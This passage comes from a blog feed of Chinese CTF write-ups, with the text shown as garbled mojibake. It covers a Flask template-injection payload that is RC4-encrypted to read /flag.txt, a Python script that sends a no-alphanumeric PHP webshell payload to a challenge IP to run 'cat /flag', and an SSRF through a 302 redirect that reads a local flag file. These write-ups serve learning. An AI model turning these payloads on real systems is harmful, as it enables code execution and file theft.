å¯†ï¼ŒçŒœæµ‹æ­¤å¤„æš´æ¼äº†å¯†é’¥</p><p>å¹¶ä¸”è§£å¯†åè¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼Œflaskï¼Œæ¨¡æ¿æ³¨å…¥â€¦â€¦</p><p>è®°å½•ä¸‹è„šæœ¬ä¸ç”¨æ³•â€¦â€¦æœ¬åœ°æŠ¥é”™ï¼Œæäº†å¥½é•¿æ—¶é—´ï¼Œè¾“å‡ºåˆä¸å¯¹</p><p>æ‹‰åˆ°kaliä¸­ï¼Œå®‰è£…python3å¯ä»¥è¿è¡Œâ€¦â€¦å¾ˆè¿·â€¦â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯</span></span><br><span class="line">    <span class="comment"># print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;resç”¨äºåŠ å¯†å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åæ˜¯ï¼š%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="comment">#print(&quot;åŠ å¯†åçš„è¾“å‡º(ç»è¿‡ç¼–ç ):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210514143837632.png" alt="image-20210514143837632"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CISCN2019-åä¸œå—èµ›åŒº-Double-Secret&quot;&gt;&lt;a href=&quot;#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 åä¸œå—èµ›åŒº]Double Secret&quot;&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ´¥é—¨æ¯hate_php</title>
    <link href="http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFhate-php/"/>
    <id>http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFhate-php/</id>
    <published>2021-05-12T12:59:43.000Z</published>
    <updated>2021-05-12T13:06:29.837Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ´¥é—¨æ¯hate-php"><a href="#æ´¥é—¨æ¯hate-php" class="headerlink" title="æ´¥é—¨æ¯hate_php"></a>æ´¥é—¨æ¯hate_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>pç¥ï¼</strong>ï¼š<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></p><p>å¯ä»¥åœ¨resä¸­çœ‹åˆ°phpç‰ˆæœ¬ä¸º5.xï¼Œè¿™é‡Œå°±éœ€è¦ç”¨åˆ°pç¥çš„php5ä¸‹çš„ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶+é€šé…ç¬¦RCE</p><blockquote><p>å¤šè¿‡æ»¤ä¸€ä¸ª@ï¼Œçœ‹ç€asciiå¾€å‰æ¢ä¸€ä¸ªå°±è¡Œ</p></blockquote><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://122.112.214.101:20004/index.php?code=?&gt;&lt;?=`. /???/????????[?-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url=url,files=files)</span><br><span class="line">res = response.text</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><blockquote><p>æœ‰ä¸€å®šæ¦‚ç‡æ€§â€¦â€¦</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;æ´¥é—¨æ¯hate-php&quot;&gt;&lt;a href=&quot;#æ´¥é—¨æ¯hate-php&quot; class=&quot;headerlink&quot; title=&quot;æ´¥é—¨æ¯hate_php&quot;&gt;&lt;/a&gt;æ´¥é—¨æ¯hate_php&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ´¥é—¨æ¯GoOSS</title>
    <link href="http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/"/>
    <id>http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/</id>
    <published>2021-05-12T11:51:48.000Z</published>
    <updated>2021-05-13T03:24:33.427Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ´¥é—¨æ¯GoOSS"><a href="#æ´¥é—¨æ¯GoOSS" class="headerlink" title="æ´¥é—¨æ¯GoOSS"></a>æ´¥é—¨æ¯GoOSS</h3><blockquote><p>å¼„æ‡‚è¿™é“é¢˜èŠ±äº†æˆ‘å¾ˆé•¿æ—¶é—´ï¼ŒæœŸé—´èµ°äº†å¾ˆå¤šå¼¯è·¯â€¦â€¦ï¼ˆ<strong>wotaicaile</strong></p><p>åœ¨å†™è¿™é“é¢˜çš„è·¯ä¸Šï¼Œæˆ‘å­¦ä¹ (äº†è§£)äº†DNSç»‘å®šæ”»å‡»ã€Googleè´¦å·éªŒè¯ã€å…è´¹åŸŸåæ³¨å†Œ(ç™½å«–)ã€golangã€æ­å»ºgoç¯å¢ƒã€ginã€dlvè°ƒè¯•golangâ€¦â€¦</p></blockquote><h4 id="ginä»£ç "><a href="#ginä»£ç " class="headerlink" title="ginä»£ç "></a>ginä»£ç </h4><p>åœ¨goç¨‹åºæœ€å‰å¯ä»¥çœ‹åˆ°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>&quot;github.com/gin-gonic/gin&quot;</code>æ—¢æ˜¯ginæ¡†æ¶ï¼Œæ‰€ä»¥æ—¢è¦çœ‹å¾—æ‡‚goï¼Œä¹Ÿè¦å­¦çœ‹ginâ€¦â€¦</p><p>è·¯ç”±ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.Use(fileMidderware)</span><br><span class="line">r.POST(<span class="string">&quot;/vul&quot;</span>, vulController)</span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, uploadController)</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;pong&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">_ = r.Run(<span class="string">&quot;:1234&quot;</span>) <span class="comment">// listen and serve on 0.0.0.0:8080</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>r.Use(fileMidderware)</code>è®¾ç½®äº†å…¨å±€ä¸­é—´ä»¶</p><p><code>r.POST(&quot;/vul&quot;, vulController)</code>è®¾ç½®äº†å¯¹è¯¥è·¯å¾„è¯·æ±‚çš„å±€éƒ¨ä¸­é—´ä»¶</p><p>vulControllerï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url Url</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;url); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: err&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ†ç»‘urlä¸ºjsonæ ¼å¼ï¼Œpostä¼ å‚æ—¶éœ€è¦ä¼ ï¼š<code>&#123;&quot;url&quot;:&quot;xxxx&quot;&#125;</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !strings.HasPrefix(url.Url, <span class="string">&quot;http://127.0.0.1:1234/&quot;</span>) &#123;</span><br><span class="line">c.JSON(<span class="number">403</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;url forbidden&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">client := &amp;http.Client&#123;Timeout: <span class="number">2</span> * time.Second&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">resp, err := client.Get(url.Url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™åˆ¶äº†å†…ç½‘è®¿é—®çš„ç«¯å£</p><p>uploadControllerï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file File</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;file); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: err&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dir := md5sum(file.Name)</span><br><span class="line"></span><br><span class="line">_, err := http.Dir(<span class="string">&quot;./files&quot;</span>).Open(dir)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">e := os.Mkdir(<span class="string">&quot;./files/&quot;</span>+dir, os.ModePerm)</span><br><span class="line">_, _ = http.Dir(<span class="string">&quot;./files&quot;</span>).Open(dir)</span><br><span class="line"><span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: e.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">filename := md5sum(file.Content)</span><br><span class="line">path := <span class="string">&quot;./files/&quot;</span> + dir + <span class="string">&quot;/&quot;</span> + filename</span><br><span class="line">err = ioutil.WriteFile(path, []<span class="keyword">byte</span>(file.Content), os.ModePerm)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;file upload succ, path: &quot;</span> + dir + <span class="string">&quot;/&quot;</span> + filename,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æ˜¯åœ¨filesæ–‡ä»¶å¤¹ä¸‹ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ï¼Œå½“æ—¶å°è¯•äº†ä¸‹ï¼Œä¼¼ä¹å¹¶ä¸å­˜åœ¨ä»€ä¹ˆæ¼æ´â€¦â€¦</p><p>fileMidderware:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fileMidderware</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">fileSystem := http.Dir(<span class="string">&quot;./files/&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.String() == <span class="string">&quot;/&quot;</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">f, err := fileSystem.Open(c.Request.URL.String())</span><br><span class="line"><span class="keyword">if</span> f == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line">fi, err := f.Stat()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> fi.IsDir() &#123;</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line">c.Redirect(<span class="number">302</span>, c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">files := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">l, _ := f.Readdir(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> l &#123;</span><br><span class="line">files = <span class="built_in">append</span>(files, i.Name())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line"><span class="string">&quot;files&quot;</span>: files,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">data, _ := ioutil.ReadAll(f)</span><br><span class="line">c.Header(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">`attachment; filename=`</span>+fi.Name())</span><br><span class="line">c.Data(<span class="number">200</span>, <span class="string">&quot;text/plain&quot;</span>, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨/vulä¸­è¯·æ±‚<code>&#123;&quot;url&quot;:&quot;127.0.0.1:1234/../&quot;&#125;</code>:</p><p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512201947610.png" alt="image-20210512201947610"></p><p>è®¿é—®åˆ°äº†ä¸Šçº§filesç›®å½•ï¼Œä¸å­˜åœ¨åˆ«çš„ä¸œè¥¿äº†â€¦â€¦</p><p>æºç ç»™äº†index.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// php in localhost port 80</span></span><br><span class="line"></span><br><span class="line">readfile($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœèƒ½è®¿é—®åˆ°80é»˜è®¤ç«¯å£ä¸Šçš„indexå¹¶ä¼ å‚å°±å¯ä»¥è·å–flag</p><h4 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line">c.Redirect(<span class="number">302</span>, c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure><p>å…³é”®æ˜¯è¿™é‡Œçš„ä»£ç â€¦â€¦ç”±äºginçš„é…ç½®ï¼Œè®¿é—®<code>xxx.xxx.xxx/haha</code>ä¸<code>xxx.xxx.xxx/haha/</code>å¹¶ä¸ç›¸åŒ</p><p><code>strings.HasSuffix</code>æ£€æµ‹<code>c.Request.URL</code>æ˜¯å¦ä»¥\ç»“å°¾ï¼Œè‹¥ä¸æ˜¯åˆ™åŠ ä¸Šå¹¶è·³è½¬ã€‚å¤§æ¦‚æœ¬æ„ä¹Ÿè®¸æ˜¯æƒ³è§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿ(å¥½åƒå“ªé‡Œåˆä¸å¤§å¯¹)â€¦â€¦</p><p>é…ç½®å¥½dlvè°ƒè¯•ä»£ç æœåŠ¡ï¼š</p><img src="/images/æ´¥é—¨æ¯GoOSS/image-20210512203038285.png" alt="image-20210512203038285" style="zoom:80%;" /><p>cä¸­å«æœ‰requestï¼š</p><img src="/images/æ´¥é—¨æ¯GoOSS/image-20210512203334500.png" alt="image-20210512203334500" style="zoom:80%;" /><p>requestä¸­å«æœ‰hostå’Œurlï¼Œè¿™é‡Œçš„urlåº”è¯¥ç±»ä¼¼ä¸ºèµ„æºæ–‡ä»¶ï¼Ÿ</p><img src="/images/æ´¥é—¨æ¯GoOSS/image-20210512204621788.png" alt="image-20210512204621788" style="zoom:80%;" /><p>å¦‚æœæˆ‘ä»¬ä¼ å…¥ï¼š<code>&#123;&quot;url&quot;:&quot;http://127.0.0.1:1234//1/..&quot;&#125;</code>ï¼š</p><p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512203705614.png" alt="image-20210512203705614"></p><p>ç½‘ç«™å°è¯•è§£æç½‘å€<strong>1</strong>â€¦â€¦</p><p>åœ¨ä¸ä»¥<code>/</code>ç»“å°¾çš„æƒ…å†µä¸‹ï¼Œ302è·³è½¬ç›´æ¥ä½¿ç”¨<strong>c.Request.URL</strong>è¿›è¡Œè·³è½¬ï¼Œç±»ä¼¼åŠ è½½å¤–éƒ¨jsï¼Œæ‹¼æ¥ä¸Š<code>/</code>åï¼Œ<code>//1/../</code>è¢«è®¤ä¸ºæ˜¯ç›¸å¯¹urlå¹¶äºˆä»¥è®¿é—®ï¼ˆå¤§æ¦‚ï¼‰ï¼Œé€ æˆssrfï¼ˆåº”è¯¥ï¼‰ã€‚</p><blockquote><p><a href="https://guokeya.github.io/post/5IcFhBKyk/">https://guokeya.github.io/post/5IcFhBKyk/</a></p><p>å¤§å¸ˆå‚…è¯´ï¼š</p><p>Locationå¯ä»¥æ§åˆ¶ä¸º//ï¼Œè€Œ//å°±æ˜¯çœç•¥HTTPåè®®çš„å†™æ³•ï¼Œä»¥ä½œå‚è€ƒã€‚</p></blockquote><h4 id="302è·³è½¬"><a href="#302è·³è½¬" class="headerlink" title="302è·³è½¬"></a>302è·³è½¬</h4><p>æˆ‘ä»¬ç°åœ¨èƒ½æ§åˆ¶ç›®æ ‡æœºè®¿é—®å¤–ç½‘ï¼Œé‚£æ€ä¹ˆåˆ©ç”¨è¿™ä¸€ç‚¹å‘¢â€¦â€¦</p><p>æˆ‘ä»¬å¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨å†™ä¸€ä¸ª302è·³è½¬ï¼Œä½¿ç›®æ ‡æœºè®¿é—®åè·³è½¬åˆ°(ç›®æ ‡æœº)æœ¬æœºçš„é»˜è®¤ç«¯å£ä¸Šå¹¶è¯»å–flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Location: http://127.0.0.1/index.php?file=/flag&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512205534307.png" alt="image-20210512205534307"></p><p>è·å¾—flagï¼</p><p>æµç¨‹ï¼š</p><p>è®¿é—®/vul-ã€‹fileMidderware-ã€‹vulController-ã€‹<code>resp, err := client.Get(url.Url)</code>-ã€‹fileMidderware-ã€‹<strong>302è·³è½¬</strong>(c.Request.URL)-ã€‹æœåŠ¡å™¨-ã€‹<strong>302è·³è½¬</strong>-ã€‹127.0.0.1/index.php?file=xxx-ã€‹flag</p><blockquote><p>æ€»ä¹‹è¿˜æ˜¯æäº†ä¸å°‘ä¸œè¥¿çš„ï¼Œè™½ç„¶æœ‰å¾ˆå¤šæ— 